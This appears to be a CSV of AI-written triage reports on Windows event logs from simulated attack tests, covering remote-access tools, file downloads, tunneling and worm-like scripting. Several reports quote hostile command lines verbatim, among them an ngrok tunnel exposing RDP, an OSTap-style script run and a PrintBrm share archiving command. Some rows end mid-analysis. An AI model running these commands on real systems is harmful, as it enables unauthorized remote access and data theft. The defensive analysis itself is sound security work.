Directory Name,AI Response
Download a file with IMEWDBLD.exe,"After a thorough review of the provided Windows event logs, the following assessment and observations can be made:

### Observations:

1. **PowerShell Activity**:
   - There is a complex PowerShell command being executed: `""powershell.exe ""& {$imewdbled = $env:SystemRoot + ""\""\System32\IME\SHARED\IMEWDBLD.exe\"""",[Redacted URL]""`
   - The PowerShell script is attempting to download a file from an external source (a raw.githubusercontent.com URL), which might be a potential script or configuration file.

2. **Sysmon Events**:
   - The Sysmon logs indicate the execution of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `dllhost.exe`. While these processes can appear in legitimate system use cases, their concurrent execution alongside suspicious PowerShell activity raises concerns.
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\admin_test` in a short timeframe. This could indicate script execution for event log management, a common tactic in persistence or covering tracks.
   - `imewdbld.exe` is executed with a command that points to an external resource, which could suggest unauthorized use.

3. **Security Events**:
   - Multiple logon events with elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) indicate potential usage of an admin account with broad privileges. The user `admin_test` is noted to have these elevated privileges.

4. **Service and Software Execution**:
   - The `MicrosoftEdgeUpdate.exe` service stopped and restarted, which is typical behavior during updates. However, its concurrency with suspicious activity necessitates further scrutiny.

### Assessment:

- The combination of PowerShell activity fetching scripts from an external URL, elevated privilege usage, and multiple concurrent execution of administrative utilities on `Server002` provides a compelling case for anomalous behavior. 
- Specifically, the external download attempt via PowerShell is a red flag, and such activity should not occur without explicit authorization.

### Resolution: **SUSPICIOUS**

Given the collected evidence and the behavior observed in the logs, the activities should be classified as **SUSPICIOUS**. There are clear signs pointing to potential security risks that require further investigation to confirm or rule out malicious activities.

### Guidance on How to Proceed:

1. **Containment**: Immediately review the `admin_test` user's account for any unauthorized access or changes. Consider isolating the host (`Server002`) from the network until further investigation ensures it's safe.

2. **Network Analysis**: Check network logs and proxy logs for any communication to or from the suspicious external URL and analyze any downloaded content for malicious payloads.

3. **Forensic Investigation**: Conduct a comprehensive forensic analysis on `Server002`, focusing on file integrity, unknown executables, and unusual system modifications, to identify any traces of malware or persistence mechanisms.

4. **Review Scripts and Configurations**: Inspect any scripts and configuration files that could have been modified or introduced during this timeframe.

5. **User Awareness and Password Changes**: Alert the user `admin_test` to potential misuse of their credentials. Initiate a mandatory password change and enhance monitoring of similar accounts.

These steps will aid in determining the nature of the activity and prevent potential security breaches."
iwr or Invoke Web-Request download,"**Detailed Analysis of Windows Event Logs**

**Indicators of Potential Malicious Activity:**

1. **Time Discrepancy Events:** 
   - **Security Log and System Log Events (Event ID: 4616):** There is a noticeable occurrence where the system time was adjusted backward. 
   - This adjustment might not always indicate malicious behavior, as it can also result from legitimate system updates or time synchronization events. However, such actions should be verified as they can also be indicative of malicious activities trying to cover tracks by disrupting log consistency.

2. **Sysmon and PowerShell Activity:**
   - The **Sysmon log (Event ID: 1)** and **Windows PowerShell log (Event ID: 600 and 403)** indicate the execution of PowerShell with the command to use `Invoke-WebRequest` (iwr) to download a file from an external URI.
   - This is a red flag as it could potentially be used for downloading malicious payloads. The URI is `https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt`, which seems unusual for a regular license or legitimate software operation, especially without context or authorization.

3. **Execution of `wevtutil` and `conhost`:**
   - **Sysmon log entries** show the execution of `wevtutil.exe`, which is typically used to export event logs and can also be used to clear them. 
   - The frequent invocation of `conhost.exe` associated with other processes is not inherently suspicious by itself but could be indicative of a process being used to handle console windows associated with potentially malicious activity.

4. **Unauthorized Tools and Commands:**
   - Use of `whoami.exe`, `hostname.exe`, and repetitive PowerShell invocations with a high integrity level could suggest reconnaissance activities or privilege escalation attempts by an unauthorized user.
   - Frequent usage by the user `SERVER002\admin_test` executing such commands is worth noting. 

**Assessment:**

The logs reveal suspicious behavior primarily involving the execution of PowerShell scripts likely intended to download files from an external source, coupled with system time adjustments that could point towards track covering efforts. These signs necessitate immediate attention despite the absence of definitive malware.

**Risks Identified:**
- Potential downloading and execution of malicious code via PowerShell.
- Possible track covering using time adjustments.
- Activity patterns indicative of reconnaissance or privilege misuse.

**Guidance on How to Proceed:**
1. **Immediate Review**: Investigate the source and intention of the PowerShell script fetching external files, and validate the legitimacy of the URI.
2. **Time Change Verification**: Confirm whether the time changes were legitimate system operations or unauthorized actions. Ensure time synchronization settings are secured against tampering.
3. **Credential and Access Audits**: Review user `SERVER002\admin_test` activities and permissions specifically related to the initiated processes.
4. **Threat Hunt**: Conduct a thorough review on `Server002` using advanced endpoint detection and response (EDR) tools for signs of further compromise.
5. **Policy Enforcement**: Enhance PowerShell execution policies and logging for detection and prevention of similar unauthorized activities in the future.

**Resolution: - SUSPICIOUS**

Given the outlined anomalies, the current logs warrant a classification of **SUSPICIOUS**. This denotes activity that is abnormal and merits further investigation to preclude any risk of compromise."
Lolbas replace.exe use to copy UNC file,"### Analysis of the Logs

#### Unusual Process Execution

1. **Repeated Execution of wevtutil.exe and conhost.exe**: 
   - The Sysmon logs show repeated and rapid execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. 
   - `wevtutil.exe` is used for managing event logs which is a legitimate tool but can be used by attackers to clear logs.

2. **Execution of cmd.exe with Suspicious Command Line Arguments**:
   - There is an event showing `cmd.exe` executing a potentially suspicious command: 
     - `\""cmd.exe\"" /c del %%TEMP%%\\file.cab >nul 2>&1 & C:\\Windows\\System32\\replace.exe \\127.0.0.1\\c$\\file\\files\\data\\src\\file.cab %TEMP% /A`
   - This command suggests the deletion of a file in the TEMP directory and use of `replace.exe` which might be indicative of staging or tampering with files.

3. **Execution of HOSTNAME.EXE and WHOAMI.EXE**:
   - Both processes are used for system information gathering (`hostname` to get the system's hostname and `whoami` to get the username). While not inherently malicious, they can be indicative of reconnaissance activities.

#### Software Updates

1. **Microsoft Edge Update Activity**:
   - Multiple processes related to `MicrosoftEdgeUpdate.exe` are logged, which involves typical update operations. 
   - Processes with unusual paths like `C:\\Program Files (x86)\\Microsoft\\Temp\\EUBB86.tmp\\MicrosoftEdgeUpdate.exe` which are not common.
   - The existence of Edge Update processes by NT AUTHORITY\SYSTEM is typical of system processes updating software.

#### Time Service

- An event from the Windows Time Service indicates synchronization with `time.windows.com`. This activity is standard and not suspicious on its own.

### Assessment and Recommendations

1. **Suspicious Activity**: 
   - The repeated use of `wevtutil.exe` could indicate attempts to tamper with event logs, often associated with malicious intent.
   - The command line executed by `cmd.exe` is non-standard and may suggest data or evidence manipulation.

2. **Potential Malicious Activity**:
   - The execution pattern and processes used could suggest an unauthorized script or tool running under `SERVER002\admin_test`.
   - Given that these activities may involve data manipulation and potential reconnaissance, they should be further investigated.

3. **Benign Software Updates**:
   - The Microsoft Edge update activities are consistent with legitimate software updating routines and generally benign unless contextual mismatches (e.g., unusual timing or distribution method) are present.

### Final Resolution

Based on the analysis conducted and the contextual clues from the events captured:

- **SUSPICIOUS**: The activity of wevtutil.exe and cmd.exe with specific command construction suggests that further investigation is necessary to rule out malicious activities, even though the automated software update log entries for Edge appear benign. 

### Next Steps

1. **Investigate the User Account**: 
   - Review the activity for `SERVER002\admin_test` to determine if this is regular for this account or if it shows signs of compromise.

2. **Examine Command Executions**:
   - Verify the context in which `cmd.exe` and `wevtutil.exe` were executed and if they align with expected administrative activities.
   
3. **Log Review & Baseline Establishing**:
   - Check for scheduled tasks, scripts, or administrative tools that may be orchestrating these command executions.
   - Consider establishing a baseline for typical command usage and system interactions to identify deviations in the future.

DNS over HTTPS Large Query Volume,"### Detailed Analysis of the Windows Event Logs

Upon carefully examining the provided logs, several key observations and analysis points are noted:

#### System and Security Logs
1. **Time Change Events:**
   - Multiple time change events (`EventID 1` and `EventID 24`) are observed, executed by `svchost.exe`. These are generally benign, typically caused by time synchronization with time servers such as `time.windows.com`.

2. **Logon Events:**
   - Logon `EventID 4624` with `LogonType 5` and `3` are present. `LogonType 5` indicates a service startup, while `LogonType 3` indicates network logon, which can occur during legitimate activities such as remote desktop or file shares. 
   - The account `admin_test` appears to have been logged in from `DESKTOP-3HL5B2P` using NTLM authentication, which could be standard behavior, but with no further context could be suspicious if unexpected.

3. **Administrative Privileges:**
   - Privilege escalation events (`EventID 4672`) for `system` and `admin_test` indicating assignment of a wide range of administrative privileges. 
   - The presence of administrative privileges is not inherently suspicious since services and legitimate administrative actions require these rights.

#### Sysmon Logs
1. **Wevtutil and WMI Activity:**
   - `wevtutil.exe` and `conhost.exe` activities are noted in Sysmon logs without unusual flags, used for querying event logs and debugging. Thes are not inherently malicious.
   - `powershell.exe` running with obfuscated commands using `Invoke-WebRequest`. The command aimed at external IP (8.8.8.8) seems contrived for misuse, possibly for data exfiltration or C2 (command and control), which could be an IOC (Indicator of Compromise).

2. **Process Executions Related to Microsoft Edge Update:**
   - Numerous processes under the path `C:\Program Files (x86)\Microsoft\EdgeUpdate\` execute, which align with the normal operation related to application updates.
   
3. **Powershell Script Execution:**
   - A PowerShell command that sends requests for random domains suggests a possibility of malicious scripting or data exfiltration attempts via external channels.

#### Application and PowerShell Logs
1. **Edge Update:**
   - Logs indicating service stop which is also seen commonly during software updates. 
   
2. **PowerShell Logs:**
   - Multiple logs showing the start and running of PowerShell providers which match the command identified in the Sysmon logs.
   
3. **External Connections and Scripts:**
   - PowerShell logs correlate with the suspicious PowerShell script activity identified earlier. This activity indicates a potential unauthorized script execution leveraging network connectivity to an external server.

### Assessment of the Situation
Upon examining the logs:
- **BENIGN:** Most activities align with expected behaviors such as standard Windows operations and application updates.
- **SUSPICIOUS:** The PowerShell activity querying an external DNS service with randomized requests is a red flag.
- **MALICIOUS:** There is significant suspicion due to the unexplained PowerShell behavior, which might indicate probing or data exfiltration attempts.

### Resolution: SUSPICIOUS

### Guidance for Further Actions:
1. **Immediate Review:** Conduct a thorough review of the `admin_test` account activities, especially considering potential misuse through PowerShell commands.
2. **Endpoint Monitoring:** Set up endpoint security alerts for PowerShell and external communications, especially through DNS queries.
3. **Network Restrictions:** Consider restricting unauthorized outbound HTTP(s) requests from similar hosts.
4. **Incident Response:** Collect forensic images of affected systems for further malware analysis.
5. **Review Configurations:** Assess current security configurations, including PowerShell logging and execution policies.

**Note**: Additional context could adjust this assessment, but the logged behavior, especially around PowerShell execution, warrants concern and further scrutiny."
Run ngrok,"**Detailed Log Analysis:**

Upon reviewing the provided Windows event logs, certain behaviors that indicate potentially malicious activities have been observed, particularly those related to the use of PowerShell and ngrok, which can be used for unauthorized remote access.

1. **PowerShell Activity:**
   - There is a PowerShell command `powershell.exe & {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null, Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null, Start-Sleep -s 5, Stop-Job -Name Job1 | Out-Null}` which is suspicious. This command is setting up ngrok to create a tunnel over TCP port 3389, which is commonly used for Remote Desktop Protocol (RDP) connections. This indicates an attempt to expose the RDP service publicly, potentially for unauthorized remote access.
   
2. **ngrok Execution:**
   - Entry of `ngrok.exe` being executed to configure and maintain a remote connection through port 3389 is indicative of an attempt to bypass network restrictions and possibly open a backdoor for remote control. Such activity, especially running from a public directory, is suspicious because it can facilitate unauthorized remote access through a secure tunnel.
   
3. **High Integrity Level Execution:**
   - The process integrity levels are marked as ""High"", indicating that these actions were carried out with elevated privileges, which is concerning for such operations without clear authorization and context.

4. **Process Hierarchies:**
   - The parent-child process relationship shows that PowerShell initiated various processes including `ngrok.exe`, confirming that the PowerShell script is responsible for these changes, which aligns with behavior seen in a potential breach.

**Assessment of the Situation:**
- The events in these logs demonstrate the setting up and execution of ngrok, potentially acting as a covert tunnel for remote access via RDP using PowerShell scripts. This activity is generally unwarranted unless conducted for legitimate administrative purposes by verified personnel, which should be closely reviewed and validated by security policies.

**Identified Threats and Risks:**
- Potential unauthorized remote access (backdoor).
- Bypassing of network security measures.
- Elevated execution of suspicious scripts.

**Guidance on How to Proceed:**
1. **Immediate Action Required:**
   - Terminate any running processes related to `ngrok.exe` and `powershell.exe` with the suspicious command-line.
   - Revoke any credentials and tokens that may have been compromised.
   - Evaluate access logs related to RDP access to detect unauthorized login attempts.

2. **Investigation:**
   - Conduct a thorough investigation of all machines and network traffic to identify any further unauthorized access.
   - Assess whether the activity was sanctioned by the administrative group or if it is indeed an intrusion.

3. **Remediation:**
   - Enhance monitoring on critical assets and network endpoints.
   - Issue a security advisory to all teams and reinforce training on recognizing and dealing with unauthorized access attempts.

4. **Preventive Measures:**
   - Implement stricter access controls and validate any use of remote access tools.
   - Audit all PowerShell scripts and administrative access regularly.
   - Consider deploying stronger endpoint detection and response solutions to alert on similar patterns in the future.

**Final Resolution:** MALICIOUS

Based on the analysis, the activity captured in the event logs is clearly indicative of malicious behavior aimed at creating unauthorized remote access via the RDP port using tools and scripts with elevated privileges. Immediate corrective and preventive actions should be taken to secure the environment."
Printer Migration Command-Line Tool UNC share folder into a zip file,"### Detailed Analysis of the Logs

#### Security Logs:

1. **EventID 4616**: These logs indicate a change in system time on `Server002`. The process responsible for this is `svchost.exe`, running as `LOCAL SERVICE` under `NT AUTHORITY`. This particular entry does not appear immediately suspicious as changing system time is something that can be done for legitimate maintenance activities, although it could also be used to manipulate event timelines in more malicious activities.

#### Sysmon Logs:

2. **EventID 5**: This EventID is typically associated with process termination. Numerous processes associated with `admin_test` are running, such as `wevtutil.exe`, `conhost.exe`, and `cmd.exe`. These are native Windows processes but their usage alongside a system command:
   - `cmd.exe` executes `del %%TEMP%%\\PrintBrm.zip` and then `PrintBrm.exe -b -d \\127.0.0.1\c$\file\files\data\src\ -f %%TEMP%%\\PrintBrm.zip -O FORCE`. This command seems to deal with print management, like backing up using `PrintBrm.exe`, but the localhost usage and temporary ZIP file deletion are a bit intriguing as they can be used for data exfiltration or cleanup after executing a task. This series of commands requires close attention due to its complexity and unusual use pattern.

3. **Process Execution**: Notably `hostname.exe` and `whoami.exe` executions are observed—usually used for diagnosing networking issues, confirming user identity, etc. These might indicate post-exploitation reconnaissance if run together frequently.

4. **Integrity Levels & User Context**: The processes are running with a `High` integrity level under the context of `SERVER002\\admin_test`, which indicates privileged execution. While indicative of an administrative task, if unexpected, it could be abused by a malicious actor for harmful actions.

#### System Logs:

5. **Kernel-General (EventID 1, 24)**: Logs related to time adjustments corroborate the Security log observations. The repeated change of the system time should be further correlated with any tasks scheduled to occur around these times to verify legitimacy.

#### Application Logs:

6. **Security-SPP (EventID 16384)**: This is related to the Windows Software Protection Platform service. It shows no immediate issues but aligns with attempts to manage/alter licensing, possibly after activation by triggers.

### Assessment

- **Process Activity**: 
  - Use of `cmd.exe` in conjunction with a local file operation and backup utility.
  - Multiple Windows utilities executed in quick succession (e.g., `whoami`, `hostname`), potentially indicating improper use of legitimate tools.
- **System Time Modification**: Occurred twice within a short period. While potentially routine, it could adjust for timezone syncing; in malicious scenarios, it can be used to obscure activities or tamper with log entries.

### Conclusion

**Resolution**: **SUSPICIOUS**

The activities documented in the logs highlight several signs of potentially unauthorized or suspicious behavior warranting further investigation:
- Check who executed these tasks and whether these actions conform to expected user behaviors or known administrative schedules.
- Investigate the `admin_test` account's recent activity logs, including remote login history and any cross-referenced technologies or scripts that might need examination.
- Validate if there have been any system/application settings altered that shouldn't have been, especially in relation to security or time-related configurations.

In-depth user activity analysis, possibly reconstructing events around the time modifications, is necessary to determine if additional evidence of compromise exists."
OSTAP Worming Activity,"Upon analyzing the provided Windows event logs, here's a detailed examination focusing on potential indicators of malicious activity:

### System Log:
The system logs primarily record time changes, all orchestrated by `svchost.exe`, which is a legitimate Windows process often used by multiple services. There doesn't appear to be any direct indication of malicious activity in terms of abnormal process execution or privilege escalation.

### Application Log:
The logs suggest that the Edge update service has stopped twice within two seconds. This could be a routine stop, but given the frequency and proximity of events without a clear reason, it may warrant closer scrutiny.

### Security Log:
Events related to time change are recorded, consistent with the system log. No direct indication of a security breach is evident from these entries.

### Sysmon Log:
The Sysmon log contains several entries concerning process creation events. Here are the main observations:

1. **Frequent Invocation of `wevtutil.exe` and `conhost.exe`:** These processes are invoked by `SERVER002\admin_test`. `wevtutil.exe` is a legitimate tool but repeated invocations within a short timeframe can be suspicious if they aren't part of routine operations.

2. **`cmd.exe` with a Powerful Command:**
   - The command executed by `cmd.exe` in `ProcessId 2236` is particularly concerning:
     ```plaintext
     ""cmd.exe"" /c pushd \\localhost\C$ & echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""fileTestFiledata.js"", true);newfile.WriteLine(""This is an file file test file for data. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > fileTestdata.js & CScript.exe fileTestdata.js //E:JScript & del fileTestdata.js /Q >nul 2>&1 & del fileTestFiledata.js /Q >nul 2>&1 & popd
     ```
   - The command seems to be creating and running a script file, which is a tactic often associated with malware propagation, specifically:
     - Writing a script file.
     - Executing the script using `CScript.exe`.
     - Cleaning up by deleting the created files.
   
3. **Activities of `MicrosoftEdgeUpdate.exe`:** 
   - Multiple entries for the Microsoft Edge updating processes are seen. While common for system maintenance, the density and timing alongside suspicious activities might be worth monitoring but are not inherently malicious.

### Risk Assessment:
- **Suspicious Behavior:** The activity captured in the Sysmon logs involving `cmd.exe` and file creation/execution is highly suspicious. This behavior mirrors tactics used by some malware families, particularly those trying to propagate through network shares.

### Resolution: SUSPICIOUS
The logs show suspicious activity, especially regarding script file manipulation that could indicate an attempt of malware activity. It's crucial to investigate further by:

- **Deep Dive:** Conduct a thorough analysis of the system's file system to check for unexpected or malicious files.
- **Network Monitoring:** Ensure that no unusual outbound connections are made from `Server002`.
- **Review User Actions:** Check activities associated with `SERVER002\admin_test`.
- **Log Correlation:** Correlate these logs with any network or other endpoint security logs to detect lateral movement.

Based on these observations, further investigation is warranted to determine the extent of the issue and confirm any compromise."
DNS Long Domain Query,"Upon analyzing the provided logs, here's a detailed breakdown of observations related to any potential malicious activity and an assessment of each log entry:

### Analysis of Application Log
- **Software Protection Platform Service (EventID: 16384):**
  - This event is related to the normal operation of the Software Protection Platform Service and does not indicate any suspicious activity.
- **EdgeUpdate Service Stopped (twice):**
  - The stopping of the Microsoft Edge Update service is common during updates or maintenance tasks. This appears benign unless it's frequently starting and stopping in a short time frame, which is not observed here.

### Analysis of Sysmon Log
- **Process Execution Events:**
  - Multiple benign Microsoft Windows system processes like `HOSTNAME.EXE`, `conhost.exe`, and `whoami.exe` are executed. These processes and their subsequent conhost calls are standard and typically harmless.
  - We observe that `powershell.exe` was invoked with a command involving a PowerShell script at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data-dns-domain-length.ps1` querying DNS TXT records. This can be suspicious if not part of regular operations. Details about the script and its intention should be verified further.
- **Edge Update Executions:**
  - The repeated execution of different processes related to Microsoft Edge Update (e.g., `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`) is seen. These events are consistent with a software update process and by themselves do not indicate anomalous behavior unless seen with non-standard binaries, which is not observed here.

### Analysis of PowerShell Log
- **PowerShell Activity:**
  - PowerShell `EventID: 600` logs indicate that a PowerShell script was executed with parameters. These logs correspond to PowerShell starting necessary providers. The command `data-dns-domain-length.ps1` is executed to query DNS records.
  - The specific subdomain and TXT query suggest a detailed DNS lookup, possibly for testing or legitimate querying purposes, but needs further context to ensure it's not part of an unexpected activity, such as domain fronting or tunneling.

### Analysis of Security Log
- **User Login and Privileges (Events 4634, 4672, 4624):**
  - User `admin_test` logged in with elevated privileges (SeSecurityPrivilege, SeBackupPrivilege, etc.) via NTLM which is common in many environments. Given the user has high-integrity processes, it's worth double-checking if these actions align with expected behavior for the user or scheduled tasks.

### Conclusion and Resolution
Overall, the logs primarily show regular operating systems processes and Edge update operations. However, the PowerShell activity, particularly involving the execution of a script that queries DNS information, stands out because it could potentially relate to reconnaissance or other unwanted operations.

**Resolution: SUSPICIOUS**

- **Guidance:**
  1. Verify the legitimacy and intent of the `data-dns-domain-length.ps1` PowerShell script. Determine if this is part of a scheduled task or an administrative operation.
  2. Check if the script source path and usage align with known operations or policies in the organization.
  3. Review user `admin_test`'s activity logs to ensure they align with expected patterns, including checking any recent changes to user privileges or unexpected elevated command executions.
  
Further investigation and confirmation will help determine whether these activities are part of normal operations or require mitigation."
XOR Encoded data,"Upon reviewing the provided Windows event logs, I conducted a detailed analysis aimed at uncovering any indicators of potential malicious activity. My examination focused on identifying unusual processes, command-line arguments, and any suspicious patterns that could imply malicious intent. Below are the findings from the logs:

1. **Application Log Analysis:**
   - The entry from the Software Protection Platform Service (SPP) seems routine. The event ID 16384 with the mention of ""RulesEngine"" suggests regular application activity without signs of compromise.

2. **System Log Analysis:**
   - I noted several events related to time synchronization activities involving `svchost.exe`. Time adjustments are common in system operations and align with internal NTP time synchronization. These events typically represent benign activity.
   - Extending this analysis, there are no direct indicators of privilege escalation or process anomalies within these entries.

3. **Security Log Analysis:**
   - Event ID 4616 records time change activities by `svchost.exe`, attributed to a standard service user (""LOCAL SERVICE""). These reflect internal time adjustments and do not indicate any aberrant behavior.

4. **Sysmon Log Analysis:**
   - A `whoami.exe` execution was noted, originated from a PowerShell host process, which might have been used to check the current logged-on user — a benign lookup unless seen in conjunction with other suspicious activity.
   - A concerning instance was found involving `PowerShell.exe` being used to obfuscate data and send it via an HTTP POST request to `example.com` — a behavior characteristic of data exfiltration or command-and-control communication. The obfuscation technique using XOR and internet communication is a typical red flag for malicious activity.
   - Additional benign-looking processes and system utilities—such as `hostname.exe` and `conhost.exe`—are seen executed by a standard user without signs of malicious use in the logs.

5. **PowerShell Log Analysis:**
   - Confirmed the presence of a potentially harmful PowerShell script. The command line indicates attempts to encrypt and send data to a remote location, suggesting possible unauthorized data transmission or system compromise attempts.

### Assessment and Conclusion:

Based on the comprehensive analysis of the logs, the primary point of concern is the execution of a PowerShell command containing obfuscated code that attempts to send data over the network. This behavior is consistent with malware activities involving covert communication and data exfiltration.

### Resolution:

**MALICIOUS** - The identified PowerShell activity is clearly suspicious and indicative of malicious intent, warranting immediate investigation and response. Steps should be taken to isolate the affected host, analyze potential impacts, and trace any data exfiltration paths.

### Recommended Actions:

1. Immediately isolate the affected system (Server002) from the network to prevent further data leakage or command execution.
2. Conduct a thorough forensic analysis on the system to determine the scope and source of compromise.
3. Review firewall and proxy logs for HTTP requests to `example.com`, which might reveal further insights into the attack’s communication.
4. Reset relevant credentials and session tokens, as the attacker might have gained unauthorized access.
5. Consider enhanced monitoring via EDR solutions to detect and prevent similar PowerShell misuse in the future. Implement PowerShell logging and script block logging to catch similar incidents early.

By addressing these actions, the security team can mitigate immediate risks and enhance future resilience against such threats."
TeamViewer Files Detected Test on Windows,"After reviewing the provided Windows event logs, several notable points emerge, particularly around the PowerShell activity:

1. **Suspicious PowerShell Activity**:
   - **PowerShell Script Execution (EventID: 600)**: Multiple PowerShell events on ""Server002"" reference a script execution that:
     - Downloads a TeamViewer setup file using `Invoke-WebRequest`.
     - Saves it to the Desktop.
     - Executes the setup with silent install options (`/S`).
     - Subsequently launches TeamViewer (`Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'`).
   - While PowerShell is commonly used for legitimate automation tasks, downloading and executing scripts can indicate malicious behavior if not authorized.

2. **TeamViewer Installation**:
   - The sequence of events shows the download and installation of TeamViewer, followed by various TeamViewer process executions and service installations. These include `TeamViewer_Setup.exe`, `TeamViewer_Service.exe`, and the TeamViewer application itself.
   - Installation of remote desktop software like TeamViewer without prior authorization could be used for unauthorized access or data exfiltration.

3. **Privilege Escalation and Sensitive Privileges**:
   - Several logon events (EventID: 4672) indicate that the ""admin_test"" user was granted high-level privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. This is typically associated with administrative or potentially malicious activities.

Given these observations, the presence of PowerShell commands to download and install software, the execution of remote access software without explicit consent, and the use of privileged accounts collectively raise a red flag.

### Conclusion
- **Resolution**: **SUSPICIOUS**
- **Reason**: While some elements could be part of legitimate IT operations (such as software updates), the combination of unsolicited software downloads, execution scripts via PowerShell, and remote access software installation suggest potentially unauthorized activity that warrants further investigation.

### Guidance
1. **Immediate Actions**:
   - Verify with the IT department if the TeamViewer installation was sanctioned.
   - Check if the ""admin_test"" account is appropriately managed and if its activities are expected.

2. **Further Investigation**:
   - Trace network connections from ""Server002"" to ensure no unauthorized data exfiltration.
   - Review security policies to reflect on the need for stronger monitoring and execution control.

3. **Preventive Measures**:
   - Implement stricter PowerShell execution policies and auditing.
   - Monitor for unusual installations and privilege escalations to detect similar events proactively in the future."
Tor Proxy Usage - Windows,"Based on the provided logs, let's analyze the various entries for suspicious or potentially malicious activities:

### System Logs
The system logs mainly show Windows Update client activities and some kernel general events. These updates appear to be legitimate and typical of regular system maintenance. The specific updates referenced do not raise immediate red flags.

### Application Logs
The application logs reveal:
- Windows Defender is operational (""Windows Defender, SECURITY_PRODUCT_STATE_ON""), indicating that basic security measures are in place.

### Windows PowerShell Logs
The PowerShell logs show a series of command executions:
- A noteworthy entry involves invoking Tor with a command to execute `""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\tor\Tor\tor.exe""`. This operation is surrounded by actions like `sleep -s 60` and `stop-process -name ""tor"" | out-null`, which attempt to kill the Tor process after 60 seconds. Invoking Tor from a temporary path while using PowerShell is unusual in a typical corporate environment unless specifically approved for use, mainly because Tor is used for anonymity and can be used to obscure malicious activities.

### Security Logs
The security log entries show standard Windows authentication logs (4624 - successful logon), and there's the notable existence of privilege assignments (4672). There is consistent usage of local machine accounts with potentially elevated privileges. While there were multiple attempts to read cached credentials (5379) that failed, this is worth noting for analyzing whether specific accounts are being targeted but does not directly imply a malicious action.

### Sysmon Logs
The Sysmon entries present multiple process executions:
- Critical operations include PowerShell commands and various system utilities.
- PowerShell entries detail encoded execution commands and the running of a `tor.exe` process in a manner as noted above. The execution of `tor.exe` and similar actions suggest activities potentially undertaken to obscure specific network communications.

### Summary and Assessment
The primary indicator of concern is the invocation of Tor through PowerShell from a temporary directory, which often signifies an attempt to perform actions with potential evasive or anonymous intent. Such behavior warrants investigation, especially if no legitimate business need for Tor exists within the environment.

### Conclusion and Resolution
As a result of these findings, the following resolution is provided:
- **Resolution: SUSPICIOUS** - The invocation and control of the Tor process suggest potentially unusual or unauthorized behavior and should be investigated further. It is recommended to review user activity around this time frame, check for any other commands executed by the 'admin_test' user, and verify if there are legitimate reasons for using Tor on this host. Additionally, network traffic related to this activity should be monitored closely to rule out data exfiltration or other malicious activities."

Ammyy Admin Software Execution,"Based on the analysis of the provided logs, there are some activities that stand out and raise concerns regarding potential malicious activity.

### Key Observations:

1. **Execution of PowerShell with Suspicious Command**:
    - The Sysmon logs show multiple events where `powershell.exe` is executed with the command line arguments starting a process to run `ammyy.exe` from a `Temp` directory. This is suspicious as `ammyy.exe` is known to be associated with remote administration tools that can potentially be used maliciously for unauthorized remote access. 
    - Log Entry: 
      - `CommandLine`: `""powershell.exe"" & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\ammyy.exe\\\""}`

2. **Use of Windows Utilities**:
    - There is frequent usage of Windows native utilities like `wevtutil.exe` and `conhost.exe`. While these tools can serve legitimate administrative purposes, their unusual frequent execution in a short span, especially `wevtutil.exe`, which is often used to manage Windows event logs, may indicate attempts to manipulate or clear logs.

UltraViewer - RAT Execution,"### Detailed Analysis:

Upon examining the provided logs, several patterns and events stand out as potentially suspicious or indicative of unconventional behavior, particularly involving the application UltraViewer and its processes and services.

#### Observations:

1. **PowerShell Execution:**
   - There are multiple instances of PowerShell being invoked with the command to execute UltraViewer from a temporary directory. The script noted:  
     ```
     powershell.exe & {Start-Process -Wait -FilePath ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data_UltraViewer.exe"" -Argument ""/silent"" -PassThru Start-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'}
     ```

2. **Setup and Execution of UltraViewer:**
   - The execution of UltraViewer from a temporary directory and its installation processes is atypical. Installers and related files stored in temporary folders can sometimes indicate unauthorized deployment or potentially malicious installs if not recognized.

3. **Usage of `taskkill`:**
   - There are repeated instances of `taskkill.exe` being used to forcibly terminate processes related to UltraViewer. 
     ```
     taskkill.exe /f /im ""UltraViewer_Desktop.exe""
     ```
   - While this could be part of regular uninstallation or upgrade routines, the frequency and batch-like pattern suggests automation that warrants scrutiny.

4. **Service Installation:**
   - An UltraViewer_Service is installed as an auto-start service with LocalSystem privileges, which allows the service to start automatically and could lead to privilege escalations if misused.

5. **Use of .NET Assembly Registration Utility (`RegAsm.exe`)**:
   - Multiple executions of `RegAsm.exe` to register DLLs related to UltraViewer, such as `RemoteControl.dll` and `HtmlAgilityPack.dll`. This could suggest deep integration or manipulation of .NET components.

6. **Network-based Logon Sessions:**
   - There is an observed logon via NTLM with `LogonType` 3, corresponding to network connections potentially indicative of remote access. The user `admin_test` facilitates this logon.

7. **General Execution with High Privileges:**
   - Numerous processes, including PowerShell and UltraViewer, are executed with high integrity levels, which involve admin-like permissions. Some events explicitly list administrative privileges, such as SeDebugPrivilege, which could be leveraged maliciously.

#### Overall Assessment:

Considering the collection of behaviors observed in the logs, such as the suspicious settings for process launches, installation of a service with high privileges, and network logon types from a potential remote host, the activity seems highly irregular and warrants concern.

RemotePC Software Execution,"Upon examining the provided Windows event logs, several indicators suggest potentially suspicious activity centered around the use of the RemotePC software. Here is a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Process Execution and Locations**:
   - Multiple logs in the Windows PowerShell event ID 600 indicate the execution of the `RemotePC.exe` and other related executables from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\`). Execution of binaries from a temporary directory is often seen as suspicious as these are frequently used paths for malware to evade detection.
